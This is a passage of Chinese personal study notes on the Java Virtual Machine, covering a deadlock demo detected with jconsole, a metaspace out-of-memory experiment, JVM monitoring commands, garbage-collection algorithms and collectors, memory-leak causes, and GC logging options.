&lt;code&gt;//自己编写一个可以产生死锁的代码。使用Jconsole检测死锁。
public class MyTest3 {
    public static void main(String[] args) {
        new Thread(A::method,&quot;ThreadA&quot;).start(); //使用lambda表达式启动线程.
        new Thread(B::method,&quot;ThreadB&quot;).start();
    }
}

class A{
    public static synchronized void method(){ // 当方法持有锁时，线程过来时检测的锁是当前class的锁。
        System.out.println(&quot;method from A&quot;);

        try {
            Thread.sleep(5000);
            B.method();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}

class B{
    public static synchronized void method(){
        System.out.println(&quot;method from B&quot;);

        try {
            Thread.sleep(5000);
            A.method();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
ThreadA 和 ThreadB 是main的子线程。
 // 启动程序后，检测死锁，检测到了。结果如下图所示。&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用Jconsole检测死锁的结果。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby13effwhj31000u0gs3.jpg&quot; alt=&quot;image-20200216100604706&quot;/&gt;&lt;/p&gt;
&lt;p&gt;使用jvisualvm工具检测的结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby1632oqnj31ml0u0e81.jpg&quot; alt=&quot;image-20200216102553738&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby19i9kwkj31hr0u0b2a.jpg&quot; alt=&quot;image-20200216102855414&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;方法区产生内存溢出错误&quot;&gt;方法区产生内存溢出错误&lt;/h5&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**
    方法区产生内存溢出错误
    // 在方法区产生错误是极难的，有两种手段。
    1. 要手动设置元空间的大小，让元空间不会自动扩展。（jdk默认的元空间大小是21M。如果超过了之后，默认的会自动进行垃圾回收，之后会自动扩展元空间的大小。）
    2. 要明确的知道元空间存放的信息。存放的是元信息，并不存放对象实例。对象实例是存在堆上边的。我们可以采取特殊的手段让对象实例存放在元信息上。使用动态代理的方式创建出来的元信息是放在元空间当中的(使用cjlib库来操作的)。
*/

'操作步骤'
// 1. 添加依赖：  cglib:cglib:3.2.8
// 2. 代码如下第一图
// 3. 设置元空间的大小：   VM options ： -XX:MaxMetaspaceSize = 10M 
// 4. 输出结果为下方第二图。&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby1med2znj31hq0o81ce.jpg&quot; alt=&quot;image-20200216104133763&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby1odny8zj31qc0hw7wh.jpg&quot; alt=&quot;image-20200216104328690&quot;/&gt;&lt;/p&gt;
&lt;p&gt;使用jconsole来进行检测：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby1rf6hvyj314r0u0ay8.jpg&quot; alt=&quot;image-20200216104624696&quot;/&gt;&lt;/p&gt;
&lt;p&gt;使用jvisoualvm进行检测： 能够明确的看到元空间使用了多少M&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby1vc7zc1j31gz0u0hdt.jpg&quot; alt=&quot;image-20200216105008572&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;元空间的概念&quot;&gt;元空间的概念&lt;/h4&gt;
&lt;p&gt;原文链接：https://www.infoq.cn/article/Java-PERMGEN-Removed/&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby236h39hj30z50u0k4v.jpg&quot; alt=&quot;image-20200216105741362&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby22ownyhj30zo0u0wrl.jpg&quot; alt=&quot;image-20200216105714487&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby2455gtrj31e00rch1m.jpg&quot; alt=&quot;image-20200216105838292&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby25eiwc6j31d00r4n5j.jpg&quot; alt=&quot;image-20200216105951254&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby27du0fdj31480u0k9c.jpg&quot; alt=&quot;image-20200216110141517&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;适当监控工具的实践&quot;&gt;适当监控工具的实践&lt;/h3&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;存在两种工具。（图示化工具能看到的，命令行都可以得到。）&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;命令行工具 : jmap ; jstat ; jcmd ;jhat&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;GUI工具: jconsole ; jvisoualvm ;jmc&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;h4 id=&quot;jmap-工具介绍&quot;&gt;jmap 工具介绍&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby33fu3vfj317c0tuk8r.jpg&quot; alt=&quot;image-20200216113233697&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby2vmqc89j31xe0mu4m4.jpg&quot; alt=&quot;image-20200216112503752&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;jstat-工具介绍&quot;&gt;jstat 工具介绍&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby3592lgjj316c0mctmy.jpg&quot; alt=&quot;image-20200216113317660&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby360jlwwj320e0a27dc.jpg&quot; alt=&quot;image-20200216113503081&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上图中的MC的作用：当前的元空间的容量&lt;/p&gt;
&lt;p&gt;MU：元空间已经被使用的容量&lt;/p&gt;
&lt;h4 id=&quot;jcmd-命令介绍和-jps命令&quot;&gt;jcmd 命令介绍和 jps命令&lt;/h4&gt;
&lt;blockquote readability=&quot;11&quot;&gt;
&lt;p&gt;jps 命令： 查看当前左右线程的pid .&lt;/p&gt;
&lt;p&gt;jcmd 和 jps 配合使用，查看JVM的多种信息 。 PID等&lt;/p&gt;
&lt;p&gt;jcmd (从jdk1.7开始新增的命令)命令介绍：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;jcmd pid VM.flags ： 查看JVM的启动参数&lt;/li&gt;
&lt;li&gt;jcmd pid help : 列出当前运行的Java进程可以进行的操作。&lt;/li&gt;
&lt;li&gt;jcmd pid help JFR.dump: 查看当前命令的具体操作含义&lt;/li&gt;
&lt;li&gt;jcmd pid PerfCounter.pring: 查看JVM性能相关的参数&lt;/li&gt;
&lt;li&gt;jcmd pid VM.uptime： 查看 JVM的启动时长&lt;/li&gt;
&lt;li&gt;jcmd pid GC.class_histogram ： 查看系统当中类的统计信息&lt;/li&gt;
&lt;li&gt;jcmd pid Thread.print ： 查看当前线程的堆栈信息。&lt;/li&gt;
&lt;li&gt;jcmd pid GC.head_dump path : 查看当前堆的信息,并打印到path路径&lt;/li&gt;
&lt;li&gt;jcmd pid VM.system_properties : 查看JVM的属性信息。&lt;/li&gt;
&lt;li&gt;jcmd pid VM.version: 查看目标进行JVM版本的信息。&lt;/li&gt;
&lt;li&gt;jcmd pid VM.command_line : 命令行的参数&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;jstack pid : 查看或者导出当前线程的堆栈信息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;命令行：jps ： 查看PID&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby3d0k4atj30nu0dgtce.jpg&quot; alt=&quot;image-20200216114145788&quot;/&gt;&lt;/p&gt;
&lt;p&gt;jcmd 和 jps 配合使用，查看JVM的多种信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby3h20duqj31zq0pq7ux.jpg&quot; alt=&quot;image-20200216114538731&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;jmc命令---可视化工具&quot;&gt;jmc命令 - 可视化工具&lt;/h4&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;jmc : JAVA Mission Conreol&lt;/p&gt;
&lt;p&gt;jfr : java flight recodrding 飞行记录器&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我本地不能打开。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbydlw7un6j317205o3za.jpg&quot; alt=&quot;image-20200216173617561&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbydmj9eopj31dc0u0u0x.jpg&quot; alt=&quot;image-20200216173652966&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;jhat-对于堆转储的分析&quot;&gt;jhat 对于堆转储的分析&lt;/h4&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;功能和visualvm类似。涉及到了OQL 对象查询语言,随用随查即可。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbydulxp86j317c0tuaf5.jpg&quot; alt=&quot;image-20200216174439926&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;来一个系统性的总结与回顾&quot;&gt;来一个系统性的总结与回顾&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;ClassLoader&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;Java字节码&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;JVM的内存空间&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;2020年02月17日20:58:02 复习结束。开始新的课程啦。&lt;/p&gt;
&lt;h2 id=&quot;垃圾回收&quot;&gt;垃圾回收&lt;/h2&gt;
&lt;h3 id=&quot;垃圾回收基础概念介绍&quot;&gt;垃圾回收基础概念介绍&lt;/h3&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;垃圾回收最主要的是在堆中进行的。- - 了解了垃圾回收的原理，才能写出来更高效的代码。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;jvm运行时内存数据区域&quot;&gt;JVM运行时内存数据区域&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzp4b2p2rj317g0u0k3k.jpg&quot; alt=&quot;image-20200217210008919&quot;/&gt;&lt;/p&gt;
&lt;p&gt;个人理解：&lt;/p&gt;
&lt;p&gt;灰色区域为线程共享的，白色区域为线程隔离。&lt;/p&gt;
&lt;p&gt;方法区：存放元数据信息。常量池空间就在这个里边。&lt;/p&gt;
&lt;p&gt;本地方法栈：存放navtion的，非Java代表编写的本地方法。&lt;/p&gt;
&lt;p&gt;Java虚拟机栈（栈帧）：存放对象的引用&lt;/p&gt;
&lt;p&gt;堆：创建的对象存储在这里边。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzp8dugm2j31b70u0e81.jpg&quot; alt=&quot;image-20200217210403016&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzp8xoirqj31810u07wh.jpg&quot; alt=&quot;image-20200217210432667&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzp9x7hwqj315o0u0b29.jpg&quot; alt=&quot;image-20200217210531570&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;jvm垃圾回收gc模型&quot;&gt;JVM垃圾回收（GC）模型&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzpd7he50j31ja0igk2a.jpg&quot; alt=&quot;image-20200217210842193&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;垃圾判断的算法&quot;&gt;垃圾判断的算法&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzpdgcohlj31k00h8qdz.jpg&quot; alt=&quot;image-20200217210856009&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;引用计数算法&quot;&gt;引用计数算法&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzpdq7v5aj31ks0tcqio.jpg&quot; alt=&quot;image-20200217210911714&quot;/&gt;&lt;/p&gt;
&lt;p&gt;什么是无法解决对象循环引用的问题。&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;已经没有外部的引用引用这两个对象了，是一个完全孤立的系统，但是这个两个对象又相互引用。所以这两个对象一直无法被回收。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzphhwmvbj31dq0u0k6x.jpg&quot; alt=&quot;image-20200217211248678&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;根搜索算法&quot;&gt;根搜索算法&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzpibbszqj31dv0u04il.jpg&quot; alt=&quot;image-20200217211335917&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzpjmbxqdj31hm0mu487.jpg&quot; alt=&quot;image-20200217211451800&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;方法区&quot;&gt;方法区&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzpkl8ivcj31dy0u0av6.jpg&quot; alt=&quot;image-20200217211546895&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzpl5a9ibj31gn0u01bz.jpg&quot; alt=&quot;image-20200217211619064&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzpnkclgej31k20jqtjk.jpg&quot; alt=&quot;image-20200217211839428&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;jvm常见gc算法&quot;&gt;JVM常见GC算法&lt;/h4&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;每一种算法都有自己的好处与缺点&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzpnzq3t9j31ja0n24g5.jpg&quot; alt=&quot;image-20200217211903176&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;新生代，一般使用复制算法。&lt;/p&gt;
&lt;p&gt;老年代，一般使用标记算法。&lt;/p&gt;
&lt;p&gt;（选取算法的根据是 1、生命周期 2、有一个老年代作为分配担保的后盾 ）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&quot;标记-清除算法&quot;&gt;标记-清除算法&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzppt5rwxj31es0u0nnv.jpg&quot; alt=&quot;image-20200217212048099&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzps8d7wnj31jg0u013z.jpg&quot; alt=&quot;image-20200217212308066&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;上图中有引用的如下图所示，绿色的是垃圾回收时不会回收的，红色的是被回收的内容。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzptut2upj31ko0o0gwi.jpg&quot; alt=&quot;image-20200217212442454&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;执行完一次垃圾回收之后，结果如下图所示。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzputnrm6j31ia0o0duh.jpg&quot; alt=&quot;image-20200217212537982&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzpv049p2j31ia0mq19q.jpg&quot; alt=&quot;image-20200217212547976&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;复制收集算法&quot;&gt;复制收集算法&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzpw14hlkj319a0u0b29.jpg&quot; alt=&quot;image-20200217212646498&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzpy7nzokj317l0u04qp.jpg&quot; alt=&quot;image-20200217212851458&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzq16mzwij31ly0pwauk.jpg&quot; alt=&quot;image-20200217213143347&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzq1z2vujj31hp0u0wrz.jpg&quot; alt=&quot;image-20200217213229766&quot;/&gt;&lt;/p&gt;
&lt;p&gt;复制后的样子：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzq2voq3lj31lq0tmqk5.jpg&quot; alt=&quot;image-20200217213319395&quot;/&gt;&lt;/p&gt;
&lt;p&gt;垃圾回收后的样子&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzq3rfr06j31ic0u0qqh.jpg&quot; alt=&quot;image-20200217213411692&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzq44g8v7j31ed0u0hdt.jpg&quot; alt=&quot;image-20200217213432398&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;标记-整理算法&quot;&gt;标记-整理算法&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzq8n9wnrj31ic0k2dqe.jpg&quot; alt=&quot;image-20200217213853257&quot;/&gt;&lt;/p&gt;
&lt;p&gt;​ 示意图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzq98erylj31cx0u0qlm.jpg&quot; alt=&quot;image-20200217213928751&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzq9nc8zvj31js0ictjx.jpg&quot; alt=&quot;image-20200217213952602&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzqa4wg1dj31jy0bu461.jpg&quot; alt=&quot;image-20200217214019697&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;分代收集算法&quot;&gt;分代收集算法&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzqbcls6tj317m0u04qp.jpg&quot; alt=&quot;image-20200217214129412&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzqdccd7uj31k60so1bj.jpg&quot; alt=&quot;image-20200217214324773&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzqf544t4j31890u01hq.jpg&quot; alt=&quot;image-20200217214508783&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzqfwah2sj31lh0u0npd.jpg&quot; alt=&quot;image-20200217214550859&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2020年02月17日22:05:23 这个时候发生了一个有趣的问题，原本把笔记全部给记录到一块，现在地下的时候卡的要死，现在重新创建了一个文件，完全没有一点问题了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzr0gtcvaj31ez0u0qv5.jpg&quot; alt=&quot;image-20200217220537756&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzr1hvqqxj31tm0sy1kx.jpg&quot; alt=&quot;image-20200217220637780&quot;/&gt;&lt;/p&gt;
&lt;p&gt;永久代从jdk8之后就被替换成了元空间。用来存放元信息。&lt;/p&gt;
&lt;h4 id=&quot;内存结构分配与回收&quot;&gt;内存结构、分配与回收&lt;/h4&gt;
&lt;h5 id=&quot;内存结构&quot;&gt;内存结构&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzr2c4o84j31g80u0wwx.jpg&quot; alt=&quot;image-20200217220726901&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;内存分配&quot;&gt;内存分配&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzr39q45fj31l90u0gxh.jpg&quot; alt=&quot;image-20200217220820346&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;内存回收&quot;&gt;内存回收&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzr3tio9wj31go0u0hdt.jpg&quot; alt=&quot;image-20200217220851306&quot;/&gt;&lt;/p&gt;
&lt;p&gt;强引用 ；软引用 ；弱引用 ； 虚引用&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzr4nu79bj31ja0u0e81.jpg&quot; alt=&quot;image-20200217220938375&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzr5qrnq9j31890u07wh.jpg&quot; alt=&quot;image-20200217221042545&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzr61ibmpj31kh0u0npd.jpg&quot; alt=&quot;image-20200217221058345&quot;/&gt;&lt;/p&gt;
&lt;p&gt;scavenge ： 打扫&lt;/p&gt;
&lt;p&gt;Full : 完全的。（会导致FW的出现。占用业务线程。 要在开发中完全避免这种GC）;&lt;/p&gt;
&lt;h4 id=&quot;垃圾回收器&quot;&gt;垃圾回收器&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbzr8kx8edj31ru0u0hdt.jpg&quot; alt=&quot;image-20200217221326189&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0kuuy6sdj31ld0u0e82.jpg&quot; alt=&quot;image-20200218151805932&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;serual收集器&quot;&gt;Serual收集器&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0kwmezqfj31sm0mqwrp.jpg&quot; alt=&quot;image-20200218151955316&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0kxxss49j31930u0b29.jpg&quot; alt=&quot;image-20200218152110707&quot;/&gt;&lt;/p&gt;
&lt;p&gt;serial: 连续的、&lt;/p&gt;
&lt;h5 id=&quot;parnew收集器&quot;&gt;ParNew收集器&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0kz58y90j31h90u01kx.jpg&quot; alt=&quot;image-20200218152220636&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0l11ihr2j31ju0u0npd.jpg&quot; alt=&quot;image-20200218152409230&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;parallel-scavenge-收集器&quot;&gt;Parallel Scavenge 收集器&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0l1ifkjdj31n90u01kx.jpg&quot; alt=&quot;image-20200218152436140&quot;/&gt;&lt;/p&gt;
&lt;p&gt;parallel ： 平行的 、 scavenge ： 打扫&lt;/p&gt;
&lt;h5 id=&quot;serial-old-收集器&quot;&gt;Serial Old 收集器&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0l3rjxyhj31rq0fqgta.jpg&quot; alt=&quot;image-20200218152647396&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;parallel-old-收集器&quot;&gt;Parallel Old 收集器&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0l3ye652j31q00qqwuu.jpg&quot; alt=&quot;image-20200218152658893&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0l486oy9j31cc0u01kx.jpg&quot; alt=&quot;image-20200218152712997&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;cmsconcurrent-mark-sweep收集器&quot;&gt;CMS（Concurrent Mark Sweep）收集器&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0lnk0rt6j31to0so4gy.jpg&quot; alt=&quot;image-20200218154541565&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0lo5wixcj31kr0u0hdt.jpg&quot; alt=&quot;image-20200218154616399&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0loipopoj31fa0u0u0x.jpg&quot; alt=&quot;image-20200218154636363&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;gc垃圾收集器的jvm参数定义&quot;&gt;GC垃圾收集器的JVM参数定义&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0lp0vbixj31bk0u04qp.jpg&quot; alt=&quot;image-20200218154712889&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;java内存泄漏的经典原因&quot;&gt;JAVA内存泄漏的经典原因&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0lpkmkbcj31ro0myavr.jpg&quot; alt=&quot;image-20200218154742610&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;对象定义在错误的范围&quot;&gt;对象定义在错误的范围&lt;/h5&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;下图中的names的定义，定义为全局变量，但是只使用了一次。全局变量不会被立马被回收，但是局部变量会立马被回收的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0lqciqupj318d0u01kx.jpg&quot; alt=&quot;image-20200218154825601&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;异常处理不当&quot;&gt;异常处理不当&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0lscbj7tj319k0u01kx.jpg&quot; alt=&quot;image-20200218155024167&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0ltkcxa6j318n0u0e3k.jpg&quot; alt=&quot;image-20200218155134558&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;集合数据管理不当&quot;&gt;集合数据管理不当&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc0lu7yjjrj31f50u0qv5.jpg&quot; alt=&quot;image-20200218155209690&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;垃圾回收日志与算法深度解读&quot;&gt;垃圾回收日志与算法深度解读&lt;/h4&gt;
&lt;h5 id=&quot;新生代与老年代垃圾收集器实现详解&quot;&gt;新生代与老年代垃圾收集器实现详解&lt;/h5&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;VM options:
-verbose:gc     //会输出详细的垃圾回收的日志
-Xms20M                 //堆容量的初始大小
-Xmx20M                 //堆容量的最大大小   -- 两个值一般设置为一样的，这样不会出现抖动的现象。
-Xmn10M                 //新生代的大小是10M  
-XX:+PrintGCDetails     //打印出垃圾回收详细的信息 
-XX:SurvivorRatio=8     //eden和 survivor的比例为8:1的比例。  

//添加上方的VM options 在运行
public class MyTest1 {
    public static void main(String[] args) {
        int size = 1024 * 1024; // 1M 的容量
        byte[] myAlloc1  = new byte[2 * size]; // 创建之后每一个元素都是0
        byte[] myAlloc2  = new byte[2 * size]; // 创建之后每一个元素都是0
        byte[] myAlloc3  = new byte[2 * size]; // 创建之后每一个元素都是0
